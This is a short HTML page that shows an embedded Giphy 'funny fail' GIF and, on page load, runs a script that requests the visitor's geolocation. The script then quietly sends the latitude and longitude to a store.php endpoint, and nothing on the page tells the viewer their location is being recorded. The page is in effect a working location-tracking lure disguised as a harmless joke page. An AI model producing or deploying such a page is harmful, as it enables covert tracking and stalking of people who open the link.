<!DOCTYPE html>
<html>
<body  onload ="getLocation()">
    
    <iframe src="https://giphy.com/embed/26tP3M3i03hoIYL6M" width="480" height="414" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/afv-funny-fail-lol-26tP3M3i03hoIYL6M">via GIPHY</a></p>


<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    const xhttp = new XMLHttpRequest();
    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
    xhttp.send();
 
}
</script>

</body>
</html>
